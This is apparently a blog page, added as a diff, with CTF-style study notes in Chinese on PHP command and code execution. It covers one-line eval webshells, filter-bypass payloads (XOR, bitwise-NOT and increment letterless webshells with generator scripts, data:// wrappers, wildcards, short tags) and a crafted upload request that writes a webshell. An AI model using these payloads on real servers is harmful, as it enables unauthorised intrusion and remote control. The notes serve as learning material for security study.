@@ -1,0 +1,1028 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>命令执行 | DiFly&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(&rsquo;ls&rsquo;) ; 当前目录 system(&rsquo;ls%20/&rsquo;) ;根目录 system(&lsquo;cat%20f*&rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. &lt;?php call_user_func(&#34;assert&#34;,$_POST[&#39;cmd&#39;]); ?&gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. &lt;?php call_user_func($_POST[&#34;fun&#34;],$_POST[&#34;para&#34;])?&gt; //post:fun=assert&amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧">
+<meta name="author" content="DiFly">
+<link rel="canonical" href="https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.js" onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://DiFly0828.github.io/img/Q2.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://DiFly0828.github.io/img/Q2.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://DiFly0828.github.io/img/Q2.jpg">
+<link rel="apple-touch-icon" href="https://DiFly0828.github.io/img/Q2.jpg">
+<link rel="mask-icon" href="https://DiFly0828.github.io/img/Q2.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script defer src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js"></script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = ""; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<meta property="og:title" content="命令执行" />
+<meta property="og:description" content="命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(&rsquo;ls&rsquo;) ; 当前目录 system(&rsquo;ls%20/&rsquo;) ;根目录 system(&lsquo;cat%20f*&rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. &lt;?php call_user_func(&#34;assert&#34;,$_POST[&#39;cmd&#39;]); ?&gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. &lt;?php call_user_func($_POST[&#34;fun&#34;],$_POST[&#34;para&#34;])?&gt; //post:fun=assert&amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-14T17:35:48+08:00" />
+<meta property="article:modified_time" content="2023-09-14T17:35:48+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="命令执行"/>
+<meta name="twitter:description" content="命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(&rsquo;ls&rsquo;) ; 当前目录 system(&rsquo;ls%20/&rsquo;) ;根目录 system(&lsquo;cat%20f*&rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. &lt;?php call_user_func(&#34;assert&#34;,$_POST[&#39;cmd&#39;]); ?&gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. &lt;?php call_user_func($_POST[&#34;fun&#34;],$_POST[&#34;para&#34;])?&gt; //post:fun=assert&amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+
+        {
+          "@type": "ListItem",
+          "position":  1 ,
+          "name": "📚文章",
+          "item": "https://DiFly0828.github.io/en/posts/"
+        },
+
+        {
+          "@type": "ListItem",
+          "position":  2 ,
+          "name": "📕 web",
+          "item": "https://DiFly0828.github.io/en/posts/web/"
+        }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "命令执行",
+      "item": "https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "命令执行",
+  "name": "命令执行",
+  "description": "命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(\u0026rsquo;ls\u0026rsquo;) ; 当前目录 system(\u0026rsquo;ls%20/\u0026rsquo;) ;根目录 system(\u0026lsquo;cat%20f*\u0026rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. \u0026lt;?php call_user_func(\u0026#34;assert\u0026#34;,$_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. \u0026lt;?php call_user_func($_POST[\u0026#34;fun\u0026#34;],$_POST[\u0026#34;para\u0026#34;])?\u0026gt; //post:fun=assert\u0026amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧",
+  "keywords": [
+    ""
+  ],
+  "articleBody": "命令执行 eval内执行的是php代码 所以必须要以分号结尾\neval是代码执行函数\nsystem是命令执行函数\ncat是具体的函数\nphpinfo();\nsystem(’ls’) ; 当前目录\nsystem(’ls%20/’) ;根目录\nsystem(‘cat%20f*’);\n代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. \u003c?php call_user_func(\"assert\",$_POST['cmd']); ?\u003e //post:cmd=system(whoami) 蚁剑连接 cmd 2. \u003c?php call_user_func($_POST[\"fun\"],$_POST[\"para\"])?\u003e //post:fun=assert\u0026para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧兔纸的博客-CSDN博客\neval函数和system函数的区别——代码执行漏洞和命令执行漏洞_php命令执行函数eval和system区别_美豆阿的博客-CSDN博客\n命令执行函数 system(): passthru(): exec(): pcntl_exec(): shell_exec(): popen()/proc_popen(): echo(`ls`): 具体函数 cat tac more nl 代码执行函数被ban 1.反字节符 echo(`ls`); 2.参数＋eval eval($_GET[1];\u00261=phpinfo()); eval($_GET[1];\u00261=system('ls'));//这样只会识别到前面的 这是又传了一个参数，所以不会被检查 3.参数+include （这个没有分号‘；’） include$_GET[1]?\u003e\u00261=php://filter/read=convert.base64-encode/resource=flag.php //其中的?\u003e用来绕过分号，因为?\u003e默认给你偷偷加了一个分号 4.写入木马 file_put_contents(\"aaa.php\",%20%27\u003c?php%20eval($_POST[\"cmd\"]);%20?\u003e%27);) //将后面的代码写入aaa.php中 访问aaa.php 确认写入，蚁剑连接 5、6都需要一步一步去看这来： //print_t(scandir(pos(localeconv())));可以看到当前目录 //print_r(scandir(getcwd()));也可以 getcwd()函数返回当前工作目录 5.使用pos(localeconv)来获取小数点 show_source(next(array_reverse(scandir(pos(localeconv()))))); //localeconv可以返回包含小数点的一个数组，用pos取数组中的第一个元素———小数点， 用scandir结合可以扫当前目录。 //然后re数组 取下一个数组元素 就是flag.php //getcwd()函数返回当前的工作目录 6. print(get_defined_vars()); eval(array_pop(next(get_defined_vars()))); //get_defined_vars()返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户自定义的变量。 //array_pop()函数 删除数组中的最后一个元素并返回其值 7.通配符 直接匹配flag.php输出 code=?\u003e\u003c?=`/???/??? ????.???` 8.过滤了函数： code=?\u003e\u003c?=`ls`; web38 \u003c?php //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ //过滤了flag函数 include($c); echo $flag; } }else{ highlight_file(__FILE__); } 这里需要用伪协议绕过 但不能用filter 因为filter协议不加密输入的东西 只把输出的东西加密\n使用方法为 data://text/plain;base64,内容 ：要写的命令用base64编码放入内容 \u003c?php system('cat flag.php');?\u003e\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n无参RCE 参考链接\n无字母数字webshell总结 - 先知社区 (aliyun.com)\n0.或（ | ） 1. 异或（ ^ ） c=(\"%13%19%13%14%05%0d\"|\"%60%60%60%60%60%60\")(\"%03%01%14%00%06%0c%01%00\"|\"%60%60%60%20%60%60%60%2a\") system(\"cat fla*\") 代码\nif(preg_match(\"/(\\/|[A-Za-z]+)/\",$code)) { print(\"漏,你不能这样\"); 异或解析\n在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。\n异或脚本\nstr = r\"~!@#$%^\u0026*()_+\u003c\u003e?:,.;-[]{}`\\/\" needstr = \"T\" # 输入想要异或的字符串 dictin = {} for c in range(len(needstr)): for i in range(0, len(str)): for j in range(0, len(str)): a = ord(str[i]) ^ ord(str[j]) if needstr[c] == chr(a): print('(' + '\"' + str[i] + '\"' + '^' + '\"' + str[j] + '\"' + ')' + ' ' + 'is' + ' ' + chr(a)) dictin[c] = chr(a) 高级版 可控\n\u003c?php $shell = \"a\"; $result1 = \"\"; $result2 = \"\"; for($num=0;$num\u003c=strlen($shell);$num++) { for($x=33;$x\u003c=126;$x++) { if(judge(chr($x))) { for($y=33;$y\u003c=126;$y++) { if(judge(chr($y))) { $f = chr($x)^chr($y); if($f == $shell[$num]) { $result1 .= chr($x); $result2 .= chr($y); break 2; } } } } } } echo $result1; echo \"\n\"; echo $result2; function judge($c) { if(!preg_match('/[a-z0-9]/is',$c)) { return true; } return false; } \u003c?php $_ = \"!((%)(\"^\"@[[@[\\\\\"; //构造出assert $__ = \"!+/((\"^\"~{`{|\"; //构造出_POST $___ = $$__; //$___ = $_POST $_($___[_]); //assert($_POST[_]); 如果payload中有一些特殊字符，需要url编码\nGET型构造\n相当于传了两个参数 第一个是_ 第二个是__\npayload:\ncode=$_=(\"$\"^\"{\").(\"{\"^\"\u003c\").(\"{\"^\"\u003e\").(\"}\"^\")\");${$_}[_](${$_}[__]);\u0026_=system\u0026__=ls 让_GET=$_; ${$_}[_] = $_GET[_] 传参 参数名是_ system(ls);====${$_}[_](${$_}[__]); POST型构造\nassert($_POST[_]); $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert'; $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST'; $___=$$__; $_($___[_]); // assert($_POST[_]); payload:\n$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]); 2.取反（ ~ ） 情况：\n如果过滤了 ^ 但没过滤 ~\n取反脚本\ns = \"input\" for i in range(len(s)): print('%'+str(hex((255)-ord(s[i]))[2:]),end='') system -\u003e %8c%86%8c%8b%9a%92\nls -\u003e %93%8c%df%d0\n合起来是 ?wllm=~(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);\n3.自增自减 原理：\n\"A\"++ ==\u003e \"B\" 只要得到ASCII的一个值就可以得到任何字符\nphp中如何得到A\n当强制连接字符串和数组的时候 数组就会别转换成字符串 其值为 Array 取第一个就为A\n\u003c?php $_=[].''; //得到\"Array\" $___ = $_[$__]; //得到\"A\"，$__没有定义，默认为False也即0，此时$___=\"A\" $__ = $___; //$__=\"A\" $_ = $___; //$_=\"A\" $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\"S\"，此时$__=\"S\" $___ .= $__; //$___=\"AS\" $___ .= $__; //$___=\"ASS\" $__ = $_; //$__=\"A\" $__++;$__++;$__++;$__++; //得到\"E\"，此时$__=\"E\" $___ .= $__; //$___=\"ASSE\" $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++; //得到\"R\"，此时$__=\"R\" $___ .= $__; //$___=\"ASSER\" $__++;$__++; //得到\"T\"，此时$__=\"T\" $___ .= $__; //$___=\"ASSERT\" $__ = $_; //$__=\"A\" $____ = \"_\"; //$____=\"_\" $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\"P\"，此时$__=\"P\" $____ .= $__; //$____=\"_P\" $__ = $_; //$__=\"A\" $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\"O\"，此时$__=\"O\" $____ .= $__; //$____=\"_PO\" $__++;$__++;$__++;$__++; //得到\"S\"，此时$__=\"S\" $____ .= $__; //$____=\"_POS\" $__++; //得到\"T\"，此时$__=\"T\" $____ .= $__; //$____=\"_POST\" $_ = $$____; //$_=$_POST $___($_[_]); //ASSERT($POST[_]) php对大小写不敏感\n用url编码\n4.过滤了_ PHP中的短标签\n\u003c??\u003e == \u003c?php\u003e //需要开启short_open_tag \u003c?=?\u003e == \u003c? echo\u003e //默认开启 payload:\n\u003e?\u003c?=`{${~\"%a0%b8%ba%ab\"}[%a0]}`?\u003e 5.过滤了; 用短标签绕过\n6.过滤了$ PHP7:\n在PHP7中，我们可以使用($a)()这种方法来执行命令。这里我使用call_user_func()来举例(不使用assert()的原因上面已经解释过)。 我构造了\nshell=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,''); 其中\n~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c是\"call_user_func\"，\n~%8c%86%8c%8b%9a%92是\"system\"，\n~%88%97%90%9e%92%96是\"whoami\"。 成功执行命令\nPHP5:\nphp5不支持上面的方法来执行命令，\n无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)\n1. Linux下可以用 . 来执行文件 2. PHP中POST上传文件会把我们上传的文件暂时存在/tmp文件夹中，默认文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母\n用这个来锁定临时文件 需要多传几次\n. /???/????????[@-[] 可以根据实际\nPOST /?code=?\u003e\u003c?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?\u003e HTTP/1.1 Host: xxxxxx:2333 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type:multipart/form-data;boundary=--------123 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 106 ----------123 Content-Disposition:form-data;name=\"file\";filename=\"1.txt\" echo \"\u003c?php eval(\\$_POST['shell']);\" \u003e success.php ----------123-- 这里可以直接一句话 上蚁剑\n管道符的使用 if(!preg_match(\"/;|cat|flag/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); }//将结果重定向到空文件 错误也是 即丢弃 } 1,\" ; \": 执行完前面的语句在执行后面的语句。 2.“ | “: 显示后面的语句的执行结果。（文件名+|base64） 3.” || “：当前的语句执行出错时，执行后面的语句。前面的语句只能为假后面的语句才能执行。 4.” \u0026 “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。 5.” \u0026\u0026 “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。 ",
+  "wordCount" : "2685",
+  "inLanguage": "en",
+  "datePublished": "2023-09-14T17:35:48+08:00",
+  "dateModified": "2023-09-14T17:35:48+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "DiFly"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "DiFly's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://DiFly0828.github.io/img/Q2.jpg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    (function () {
+        let  arr,reg = new RegExp("(^| )"+"change-themes"+"=([^;]*)(;|$)");
+        if(arr = document.cookie.match(reg)) {
+        } else {
+            if (new Date().getHours() >= 19 || new Date().getHours() < 6) {
+                document.body.classList.add('dark');
+                localStorage.setItem("pref-theme", 'dark');
+            } else {
+                document.body.classList.remove('dark');
+                localStorage.setItem("pref-theme", 'light');
+            }
+        }
+    })()
+
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://DiFly0828.github.io/en/" accesskey="h" title="DiFly&#39;s Blog (Alt + H)">
+            <img src="https://DiFly0828.github.io/img/Q2.jpg" alt="logo" aria-label="logo"
+                 height="35">DiFly&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://DiFly0828.github.io/en/search" title="🔍 搜索 (Alt &#43; /)" accesskey=/>
+                <span>🔍 搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/" title="🏠 主页">
+                <span>🏠 主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/posts" title="📚 文章">
+                <span>📚 文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/tags" title="🧩 标签">
+                <span>🧩 标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/archives/" title="⏱️ 时间轴">
+                <span>⏱️ 时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/about" title="🙋🏻‍♂️ 关于">
+                <span>🙋🏻‍♂️ 关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://DiFly0828.github.io/en/links" title="🤝 友链">
+                <span>🤝 友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main page">
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+</style>
+
+<article class="post-single">
+    <div id="single-content">
+        <header class="post-header">
+            <div class="breadcrumbs"><a href="https://DiFly0828.github.io/en/">🏠 主页</a>&nbsp;»&nbsp;<a href="https://DiFly0828.github.io/en/posts/">📚文章</a>&nbsp;»&nbsp;<a href="https://DiFly0828.github.io/en/posts/web/">📕 web</a></div>
+            <h1 class="post-title">
+                命令执行
+            </h1>
+            <div class="post-meta">
+
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+
+    .parent-post-meta {
+        display: flex;
+        flex-wrap: wrap;
+        opacity: 0.8;
+    }
+</style>
+
+<span class="parent-post-meta">
+    <span id="post_meta_style_1">
+        <span class="fa fa-calendar-check-o"></span>
+        <span>2023-09-14
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    
+    
+    
+    
+    
+    
+    
+    <span id="post_meta_style_3">
+        <span class="fa fa-file-word-o"></span>
+        <span>2685字
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_4">
+        <span class="fa fa-clock-o"></span>
+        <span>6分钟
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_5">
+        <span class="fa fa-user-o"></span>
+        <span>DiFly
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_6">
+        <span class="fa fa-tags" style="opacity: 0.8"></span>
+        <span>
+            <span class="post-tags-meta">
+                <a href="https://DiFly0828.github.io/en/tags/php/" style="color: var(--secondary)!important;">PHP</a>
+            </span>
+        </span>
+    </span>
+</span>
+<span style="opacity: 0.8;">
+                    <span id="post_meta_style_7">
+                        &nbsp;&nbsp;
+                        <span class="fa fa-eye" ></span>
+                        <span>
+                            <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+                            &nbsp;&nbsp;
+                        </span>
+                    </span>
+                    <span id="post_meta_style_8">
+                        <span class="fa fa-commenting-o"></span>
+                        <span>
+                            <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js"></script>
+                            <script>
+                                let url = document.documentURI
+                                
+                                let dnsUrl = "https://DiFly0828.github.io/"
+                                let urlSplit = url.split(dnsUrl)
+                                let finalUrl = urlSplit[1]
+                                if (finalUrl[0] !== '/') {
+                                    finalUrl = '/'+finalUrl
+                                }
+                                twikoo.getCommentsCount({
+                                    envId:  null , 
+                                region:  null , 
+                                urls: [ 
+                                    
+                                    finalUrl,
+                                ],
+                                    includeReply: false 
+                                }).then(function (res) {
+                                    let count = res[0].count
+                                    const obj = document.getElementById("comment_count");
+                                    obj.innerText = count
+                                    
+                                    
+                                    
+                                }).catch(function (err) {
+                                    
+                                    console.error(err);
+                                });
+                            </script>
+                            <span id="comment_count"></span>
+                        </span>
+                    </span>
+                </span>
+
+</div>
+        </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">文章目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="命令执行">命令执行</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0" aria-label="代码执行函数">代码执行函数</a></li>
+                <li>
+                    <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0" aria-label="命令执行函数">命令执行函数</a></li>
+                <li>
+                    <a href="#%e5%85%b7%e4%bd%93%e5%87%bd%e6%95%b0" aria-label="具体函数">具体函数</a></li>
+                <li>
+                    <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0%e8%a2%abban" aria-label="代码执行函数被ban">代码执行函数被ban</a></li>
+                <li>
+                    <a href="#web38" aria-label="web38">web38</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#%e6%97%a0%e5%8f%82rce" aria-label="无参RCE">无参RCE</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#0%e6%88%96--" aria-label="0.或（ | ）">0.或（ | ）</a></li>
+                <li>
+                    <a href="#1-%e5%bc%82%e6%88%96--" aria-label="1. 异或（ ^ ）">1. 异或（ ^ ）</a></li>
+                <li>
+                    <a href="#2%e5%8f%96%e5%8f%8d--" aria-label="2.取反（ ~ ）">2.取反（ ~ ）</a></li>
+                <li>
+                    <a href="#3%e8%87%aa%e5%a2%9e%e8%87%aa%e5%87%8f" aria-label="3.自增自减">3.自增自减</a></li>
+                <li>
+                    <a href="#4%e8%bf%87%e6%bb%a4%e4%ba%86_" aria-label="4.过滤了_">4.过滤了_</a></li>
+                <li>
+                    <a href="#5%e8%bf%87%e6%bb%a4%e4%ba%86" aria-label="5.过滤了;">5.过滤了;</a></li>
+                <li>
+                    <a href="#6%e8%bf%87%e6%bb%a4%e4%ba%86" aria-label="6.过滤了$">6.过滤了$</a></li>
+                <li>
+                    <a href="#%e7%ae%a1%e9%81%93%e7%ac%a6%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="管道符的使用">管道符的使用</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        
+        activeElement = elements[0];
+        const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+        document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+    }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        if (elements) {
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
+                    (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                    return element;
+                }
+            }) || activeElement
+
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                if (element === activeElement){
+                    document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+                } else {
+                    document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+                }
+            })
+        }
+    }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;
+    }
+</script>
+        <div class="post-content"><h2 id="命令执行">命令执行<a hidden class="anchor" aria-hidden="true" href="#命令执行">#</a></h2>
+<p>eval内执行的是php代码 所以必须要以分号结尾</p>
+<p><strong>eval是代码执行函数</strong></p>
+<p><strong>system是命令执行函数</strong></p>
+<p><strong>cat是具体的函数</strong></p>
+<p>phpinfo();</p>
+<p>system(&rsquo;ls&rsquo;) ; 当前目录</p>
+<p>system(&rsquo;ls%20/&rsquo;) ;根目录</p>
+<p>system(&lsquo;cat%20f*&rsquo;);</p>
+<h5 id="代码执行函数">代码执行函数<a hidden class="anchor" aria-hidden="true" href="#代码执行函数">#</a></h5>
